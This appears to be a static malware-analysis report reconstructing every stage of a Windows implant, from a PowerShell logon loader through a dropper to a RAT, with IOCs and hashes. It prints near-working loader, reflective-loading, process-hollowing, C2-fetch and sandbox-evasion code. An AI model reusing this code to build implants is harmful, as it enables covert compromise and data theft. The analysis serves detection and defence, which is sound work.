# SOURCE RECOVERY — SOLARA / REDACTED_C2_DOMAIN implant

Reconstructed source for every stage of the implant, recovered by static
analysis only (no execution). Line references are to
`mal\dec_payload\decompiled.c` (Ghidra 11.4.2 headless) and
`mal\dec_host\decompiled.c` (the 5.5 MB RAT).

> **Ghidra artifact, corrected.** In the pseudo-C the string-helper argument
> order is reversed: `FUN_140001324(dst,cstr,str)` really computes
> **`cstr + str`**, and `FUN_1400012a0(dst,str,cstr)` computes **`str + cstr`**
> (verified by disassembling `0x140001324` → `0x140001b84`). Everything below
> has the order corrected.

---

## STAGE 1 — the logon loader (exact, byte-for-byte)

Stored base64 in `HKCU\Environment\UserCache`, decoded and executed by
`HKCU\Environment\UserInitMprLogonScript`.

```powershell
# mal\loader.ps1  (verbatim)
Start-Sleep -Seconds 35;
$k=(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;
$p='Registry::HKEY_USERS\REDACTED_SID\Software\Classes\CLSID\{A1B2C3D4-E5F6-7890-1234-567890ABCDEF}\Instance';
$b=[System.Collections.Generic.List[Byte]]::new();
0..2|%{
  $n='CacheBlock_'+$_;
  $h=(Get-ItemProperty -Path $p -Name $n).$n;
  $c=[System.Collections.Generic.List[Byte]]::new();
  for($i=0;$i-lt$h.Length;$i+=2){$c.Add([Convert]::ToByte($h.Substring($i,2),16))};
  for($i=0;$i-lt$c.Count;$i++){$c[$i]=$c[$i] -bxor $k[$i%$k.Length]};
  $b.AddRange($c)
};
Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{
  [DllImport("kernel32.dll",SetLastError=true)]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
  [DllImport("kernel32.dll",SetLastError=true)]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr e,IntPtr p,uint f,ref uint i);
  [DllImport("kernel32.dll")]public static extern uint WaitForSingleObject(IntPtr h,uint ms);}';
$ba=$b.ToArray();
$s=[W]::VirtualAlloc([IntPtr]::Zero,[uint32]$ba.Length,[uint32]0x3000,[uint32]0x40);
[System.Runtime.InteropServices.Marshal]::Copy($ba,0,$s,$ba.Length);
$tid=[uint32]0;
$th=[W]::CreateThread([IntPtr]::Zero,[uint32]0,$s,[IntPtr]::Zero,[uint32]0,[ref]$tid);
[W]::WaitForSingleObject($th,[uint32]::MaxValue)
```

Reconstructed as C:

```c
// stage1_loader.c
#define MACHINE_GUID_LEN 36
static const char *CLSID_PATH =
  "Registry::HKEY_USERS\\REDACTED_SID"
  "\\Software\\Classes\\CLSID\\{A1B2C3D4-E5F6-7890-1234-567890ABCDEF}\\Instance";

void stage1(void) {
    Sleep(35000);                              // logon-settle / sandbox evasion
    char guid[MACHINE_GUID_LEN+1];
    RegReadDword2Str(HKLM_SOFTWARE_Microsoft_Cryptography, "MachineGuid", guid, 36);

    BYTE  shellcode[69492];
    DWORD total = 0;
    for (int i = 0; i < 3; i++) {             // CacheBlock_0 / _1 / _2
        char *hex = RegReadStr(CLSID_PATH, "CacheBlock_%d", i);
        BYTE  blk[27000];
        DWORD  n = strlen(hex) / 2;
        for (DWORD j = 0; j < n; j++)          // hex decode
            blk[j] = (BYTE)strtoul(hex + j*2, NULL, 16);
        for (DWORD j = 0; j < n; j++)          // XOR with MachineGuid (repeating)
            blk[j] ^= (BYTE)guid[j % MACHINE_GUID_LEN];
        memcpy(shellcode + total, blk, n);
        total += n;
    }

    void *mem = VirtualAlloc(NULL, total, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode, total);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(thread, INFINITE);
}
```

---

## STAGE 2 — the reflective PE loader (884 bytes, shellcode offset 0)

```c
// reflective_loader.c  — classic PEB-walk reflective loader
typedef struct { void *BaseAddress, *AllocationBase; DWORD AllocationProtect, PartitionId;
                 SIZE_T RegionSize; DWORD State, Protect, Type; } MBI;

void *resolve_api(const char *name);           // PEB->Ldr->InLoadOrderModuleList
void *VirtualAlloc(void*, uint32_t, uint32_t, uint32_t);
void  VirtualProtect(void*, SIZE_T, DWORD, DWORD*);

void reflective_load(BYTE *pe) {
    DWORD  sizeOfImage = *(DWORD*)(pe + 0x50);
    uint64 imageBase    = *(uint64*)(pe + 0x30);
    DWORD  entryRva     = *(DWORD*)(pe + 0x28);

    void *base = VirtualAlloc(NULL, sizeOfImage, 0x3000, 0x40);   // MEM_COMMIT|RESERVE, RWX
    if (!base) { base = VirtualAlloc(NULL, sizeOfImage, 0x3000, 0x40); }

    memcpy(base, pe, *(DWORD*)(pe + 0x54));                        // headers

    // section copy
    WORD  nsec      = *(WORD*)(pe + 0x6);
    WORD  optSize   = *(WORD*)(pe + 0x14);
    BYTE *sect      = pe + optSize + 0x18;
    for (WORD i = 0; i < nsec; i++, sect += 0x28) {
        DWORD va    = *(DWORD*)(sect + 0x0C);
        DWORD rawSz = *(DWORD*)(sect + 0x10);
        DWORD rawPr = *(DWORD*)(sect + 0x14);
        if (rawSz) memcpy((BYTE*)base + va, pe + rawPr, rawSz);
    }

    // imports
    DWORD importRva = *(DWORD*)(pe + 0x90);
    for (DWORD *d = (DWORD*)(base + importRva); d[4]; d += 5) {
        char *dll = (char*)(base + d[3]);
        HMODULE h = LoadLibraryA(dll);
        for (DWORD *t = (DWORD*)(base + d[0]); *t; t++) {
            if (*t & 0x80000000) *(uint64*)t = GetProcAddress(h, (WORD)(*t & 0xFFFF));
            else                *(uint64*)t = GetProcAddress(h, (char*)(base + *t));
        }
    }

    // relocations
    int64 delta = (int64)base - (int64)imageBase;
    DWORD relocRva = *(DWORD*)(pe + 0xB0), relocSz = *(DWORD*)(pe + 0xB4);
    if (relocRva && relocSz) {
        BYTE *blk = (BYTE*)base + relocRva;
        for (DWORD off = 0; off < relocSz; ) {
            DWORD pageRva = *(DWORD*)(blk + off);
            DWORD blkSize = *(DWORD*)(blk + off + 4);
            if (!blkSize) break;
            for (DWORD j = 8; j < blkSize; j += 2) {
                WORD  e = *(WORD*)(blk + off + j);
                if ((e >> 12) == 0xA)                      // IMAGE_REL_BASED_DIR64
                    *(uint64*)((BYTE*)base + pageRva + (e & 0xFFF)) += delta;
            }
            off += blkSize;
        }
    }

    DWORD old;
    VirtualProtect(base, *(DWORD*)(pe + 0x54), 0xFFFFFFFF, &old);  // PAGE_EXECUTE_READWRITE
    ((void(*)(void))((BYTE*)base + entryRva))();
}
```

---

## STAGE 3 — the dropper (`payload.bin`, 68,608 B, PE64, 2026-05-31)

### 3.1 C2 configuration (recovered verbatim)

```c
// DAT_140012000 (plaintext .rdata 0x14000c6b0)
const char *C2_HOST   = "REDACTED_C2_DOMAIN";

// DAT_1400121b8 = XOR(.rdata 0x14000c340, key)  ->  campaign id
const char *CAMPAIGN_ID = "REDACTED_CAMPAIGN";

// DAT_1400121d8 = XOR(.rdata 0x14000c360, key)  ->  auth token
const char *AUTH_TOKEN  = "REDACTED_AUTHTOKEN";   // b64 -> 413b959743c2b1e18b69fba7b193d1134d3c

// assembled by FUN_1400096f8 L5866-5877 into:
//   "REDACTED_CAMPAIGN:REDACTED_AUTHTOKEN:REDACTED_C2_DOMAIN"
```

The XOR keys are 32-byte blocks materialised on the stack
(`FUN_140001e94`, key `0x98172d0b44a15dad / 0x5afc1c5509ed8110 /
0x3f89e42603c8be4b / 0x5152a98e7b192caf`).

### 3.2 The HTTP request (FUN_140002290, L1076–1480)

```c
// URL built in FUN_140001e94 L948-953
//   "https://"  (XOR immediates 0xe7647b1956ba4582, 0x3e954f0a51a0cf56  @ .rdata 0x14000c5f0)
// + "/Stb/PokerFace/init.php?id=Elton"      (XOR @ .rdata 0x14000c5c0)
// = "https://REDACTED_C2_DOMAIN/Stb/PokerFace/init.php?id=Elton"

void http_get(const char *url) {
    HINTERNET h = InternetOpenA(
        "Mozilla/5.0 (Windows NT 14_73_31; WOW64)",   // hardcoded UA
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0, 0);          // L1128

    InternetSetCookieA(url, "hash", "2239784366428af5e59516a8fd0a0faf");  // L1203

    HINTERNET s = InternetOpenUrlA(h, url, NULL, 0, 0, 0);        // L1254  -> GET, no body
    BYTE buf[20000];
    DWORD got;
    memset(buf, 0, sizeof buf);
    while (InternetReadFile(s, buf, sizeof buf, &got) && got)     // L1300 / L1346
        append(buf, got);
    InternetCloseHandle(s);                                      // L1389
    InternetCloseHandle(h);                                      // L1480
}
```

> The cookie `hash=2239784366428af5e59516a8fd0a0faf` is a **static** value —
> it is the same on every victim, so it is a perfect network signature.

### 3.3 Response handling (FUN_140001e94, L893–1070)

```c
void *fetch_payload(void) {
    char *b64 = http_get("https://REDACTED_C2_DOMAIN/Stb/PokerFace/init.php?id=Elton");
    DWORD size = CryptStringToBinaryA(b64, 0, 0, NULL, &size, NULL, NULL); // 1st call: size
    void *out = operator_new(size);                                          // L1001
    CryptStringToBinaryA(b64, 0, 0, out, &size, NULL, NULL);                // 2nd call: fill
    return out;                        // decoded PE, NEVER written to disk
}
```

### 3.4 Retry loop (FUN_1400096f8 L5882–5933)

```c
for (int attempt = 0; attempt < 10; attempt++) {
    void *pe = fetch_payload();
    if (pe && decoded_size > 0x0E) {          // must be a real PE
        memcpy(DAT_140012180, pe, decoded_size);   // L1052  stash in global
        break;
    }
    Sleep(10000);                             // L5932
}
```

### 3.5 Mutex / single-instance (FUN_1400096f8 L5687–5821) — TWO mutexes

```c
// name1 = "REDACTED_MUTEX" + "REDACTED_AUTHTOKEN"
// name2 = "REDACTED_MUTEX" + "REDACTED_CAMPAIGN"

HANDLE m = CreateMutexA(NULL, TRUE, name1);          // L5711
if (GetLastError() != ERROR_ALREADY_EXISTS) {        // 0xB7
    HANDLE other = OpenMutexA(0x1F0001, FALSE, name2);   // L5766
    if (other == NULL) {                              // campaign instance not running
        strcpy(DAT_140012000, "REDACTED_C2_DOMAIN");           // L5821  -> proceed to C2
        run_c2_loop();
    }
    // else: another instance owns the campaign -> abort silently
}
```

### 3.6 RunPE (FUN_140006cf0, L3350–3999) — 13 steps, reconstructed

```c
void runpe(BYTE *pe) {
    // 1. resolve ntdll
    HMODULE nt = GetModuleHandleA("ntdll");            // L3450
    nt = LoadLibraryA("ntdll.dll");                    // L3490
    NtQueryInformationProcess = GetProcAddress(nt, "NtQueryInformationProcess"); // L3566

    // 2. pick a host binary from a 25-entry C:\Windows\System32\*.exe list
    //    (L1489-2498) incl. svchost.exe, dllhost.exe, icacls.exe, ktmutil.exe,
    //    label.exe, lodctr.exe, logman.exe, LsaIso.exe, makecab.exe,
    //    netbtugc.exe, odbcconf.exe, pcalua.exe, print.exe, reg.exe, sc.exe,
    //    sdchange.exe, sihost.exe, sxstrace.exe, SyncHost.exe, TCPSVCS.EXE,
    //    TieringEngineService.exe, unlodctr.exe, ucsvc.exe, mountvol.exe,
    //    SecurityHealthSyst*, SensorDataService*, Spectrum.exe, Specrum.exe,
    //    SppxCtObjmObj.Exe, TapiUnatend.exe, SgrmLpac.exe, ttstacer.exe
    //    ^ the last six DO NOT EXIST on stock Windows: decoys to poison
    //      process-creation telemetry.
    const char *host = pick_host();

    // 3. create it suspended
    STARTUPINFOW si; memset(&si, 0, 0x68);
    PROCESS_INFORMATION pi;
    CreateProcessW(host, NULL, NULL, NULL, FALSE,
                   CREATE_SUSPENDED /*4*/, NULL, NULL, &si, &pi);   // L3617

    // 4. sanity: PE signature
    if (*(DWORD*)(pe + *(DWORD*)(pe + 0x3C)) != 0x4550) return;     // L3573

    // 5. anti-hook: patch NtManageHotPatch in the TARGET's ntdll
    //    (FUN_140007a38 L4005-4419) - overwrite the 6-byte prologue with
    //      b8 b8 0c 00 c0 c3   ==  mov eax, 0xC0000CB8 ; ret
    patch_hotpatch(pi.hProcess);

    // 6. find the target's real image base
    PEB_INFO pbi;                                     // 0x30 bytes
    NtQueryInformationProcess(pi.hProcess, 0, &pbi, 0x30, &ret);
    uint64 targetBase = *(uint64*)((BYTE*)pbi.PebBaseAddress + 0x10);  // ImageBaseAddress

    // 7. allocate in the target
    void *newBase = VirtualAllocEx(pi.hProcess, NULL,
                                   *(DWORD*)(pe + 0x50), 0x3000, 0x40);  // RWX
    // 8. headers
    WriteProcessMemory(pi.hProcess, newBase, pe, *(DWORD*)(pe + 0x54), NULL);
    // 9. sections
    for each section:
        WriteProcessMemory(pi.hProcess,
            (BYTE*)newBase + sect.VirtualAddress,
            pe + sect.PointerToRawData, sect.SizeOfRawData, NULL);
    // 10. retarget the target's PEB at the new base
    WriteProcessMemory(pi.hProcess, targetBase, &newBase, 8, NULL);      // L3808
    // 11. run the entry point
    CreateRemoteThread(pi.hProcess, NULL, 0,
        (BYTE*)newBase + *(DWORD*)(pe + 0x28), 0, 0, NULL);            // L3851
    // 12. restore correct section protections (FUN_14000825c L4426-5486)
    //     via ZwQueryVirtualMemory + VirtualProtectEx
    remap_sections(pi.hProcess, newBase, pe);
    // 13. resume
    SuspendThread(pi.hThread);  ResumeThread(pi.hThread);
    FreeLibrary(nt);
}
```

### 3.7 Host fingerprinting (FUN_140005b00, L2503+)

```c
char user[256]; GetUserNameA(user, &len);                     // L2692
IDXGIFactory *f; CreateDXGIFactory(&f);                        // L14000c270 / L14000a78b
DXGI_ADAPTER_DESC d; f->EnumAdapters(0,&a); a->GetDesc(&d);
char gpu[256]; wcstombs(gpu, d.Description, sizeof gpu);       // "Intel(R) UHD Graphics 620"
if (!gpu[0]) strcpy(gpu, "Unknown");                           // immediate 0x6e776f6e6b6e55
```

### 3.8 ⚠ Analysis-environment exclusion list (L2710–2948)

The username is compared against **8 XOR-encrypted candidates**; a match
diverts execution away from the normal C2 path:

```
george   Bruno   Abby   AMF   John   elz   Unknown   Admin
```

**`Admin` is in this list and is the username on this host** — so this box was
deliberately targeted, or the operator's tooling is checking for a sandbox that
happens to be named Admin. Either way it means the implant may not have run its
normal C2 path on this account.

### 3.9 Named-pipe IPC (L6124–6133)

```c
HANDLE p = CreateFileA("\\\\.\\pipe\\VccFramework", ...);   // CreateFileA + WriteFile
WriteFile(p, config_string, len, ...);
```

### 3.10 Sleep staging

5000 (L5644) · 2000 (L5864) · 10000 (L5932) · 2500 (L5978) · 6000 (L6024)

### 3.11 API-hash resolver (all 59 blocks resolved)

```
h = seed
for each byte c of the export name:
    h = ((int)(signed char)c ^ h) * 0x143
```
Each of the 59 call sites has its own random 32-bit seed. Complete
seed→hash→API table is in `mal\dec_payload\api_xrefs.txt` and in the
"Resolver → API binding table" section of the analysis notes. 28 unique APIs:
CreateFileA, CreateMutexA, CreateProcessW, CreateRemoteThread,
CryptStringToBinaryA, FlushInstructionCache, FreeLibrary, GetLastError,
GetModuleHandleA, GetProcAddress, GetUserNameA, InternetCloseHandle,
InternetOpenUrlA, InternetReadFile, InternetSetCookieA, LoadLibraryA,
OpenMutexA, ReadProcessMemory, ResumeThread, Sleep, SuspendThread,
VirtualAllocEx, VirtualProtectEx, WriteFile, WriteProcessMemory, memcmp,
memcpy, memset.

**Note:** `Sleep` resolves five times with five different seeds, because
kernel32 *and* kernelbase both export it.

### 3.12 NOT in the dropper
No keylogger, no screen capture (DXGI is used only for the adapter *name*,
not DXGI_OUTDUPL), no credential/browser theft, no file enumeration, no
registry persistence, no self-update, no uninstall. Those are in the RAT.

---

## STAGE 4 — the RAT (`host5m.bin`, 5.5 MB, PE64, 2026-09-24 02:52:39 UTC)

**Corrected assumptions:**
1. It does **not** hash-resolve APIs — it has a **full 434-slot IAT across 55
   DLLs** (import directory RVA 0x6AABB48, IAT RVA 0x555000, 0xD90 bytes).
   Invisible to Ghidra only because that RVA is past the end of the carve.
2. It has ~1,900 printable strings (the "23 strings" figure was an artifact of
   the truncated carve).
3. The `0x143` hasher belongs to the **dropper**; this binary uses a different
   resolver (multiplier `0xD349C511`, with case folding).

**Carve integrity:** `host5m.bin` is a **memory image, truncated** — 5,603,328 B
captured vs SizeOfImage 0x704000 (7,340,032 B) = **76.3 %**. Captured: all of
`.text` (RVA 0x1000–0x554BAC) and only 0x3000 B of `.rdata` (2.2 %). Missing:
most of `.rdata` (so the encrypted string tables are NOT recoverable), `.data`,
`.pdata` (so Ghidra's function boundaries are unreliable), `.rsrc`, `.reloc`.
Address map: **Ghidra .text VA = live RVA + 0xC00**; file offset = live RVA;
live base `0x017CA81F0000`.

**Capabilities:** WinINet **and** WinHTTP C2 clients · named-pipe IPC server ·
**keylogger** · **DComposition/DDPI desktop-duplication screen capture** ·
**clipboard theft** · **Opera GX cookie theft** · process injection · PEB-walk
runtime API resolver · SQLite (local storage) · nlohmann/json (protocol).

**Statically linked libraries:** libcurl · **Crypto++ 8.2.0** ·
**OpenSSL 3.4.0** (CRYPTOGAMS + libcrypto) · nlohmann/json · SQLite.

**⭐ Operator identity compiled into the binary:**
```
C:\Users\REDACTED_OPERATOR\Downloads\vcpkg-master\buildtrees\cryptopp\src\TOPP_8_2_0-66bcedf47f\
D:\CFILES\Projects\WinSSL\build\versions\3.4\3.4.0\
```
⇒ operator Windows username **`REDACTED_OPERATOR`**, project root `D:\CFILES\Projects\WinSSL`,
build via vcpkg. Manifest is `asInvoker` (no UAC elevation).

---

## COMPLETE C2 PROTOCOL SUMMARY

```
GET /Stb/PokerFace/init.php?id=Elton HTTP/1.1
Host: REDACTED_C2_DOMAIN:443
User-Agent: Mozilla/5.0 (Windows NT 14_73_31; WOW64)
Cookie: hash=2239784366428af5e59516a8fd0a0faf

-> response body: base64 of a PE
-> decoded, kept in memory only, RunPE'd into a System32 host
-> retries up to 10 times, 10s apart, if the decode is <= 14 bytes
-> local IPC over \\.\pipe\VccFramework
-> single-instance via REDACTED_MUTEX{CAMPAIGN_ID} and REDACTED_MUTEX{AUTH_TOKEN}
```

---

## Sample hashes

| File | Size | SHA256 | MD5 |
|---|---|---|---|
| `shellcode.bin` | 69,492 | `ff7e3fe52a343be7b597fd77d34b7fd7f6811ed9c821ac2266e3225a9bb2acd3` | `4e7cee74894890b3aa8ff8a860b134d6` |
| `payload.bin` | 68,608 | `245c4870dbf4b2f0102835addb1780d845bd1c31d5ac2a8ac7a5dfe993d6365f` | `32b268f7114cd6816d3b1c0558e88f95` |
| `host5m.bin` | 5,603,328 | `5DD2A483CC31D4EE47F469D540422E69F56D27C164170BDBEF10FC58880A9804` | (see `mal\hostid.txt`) |
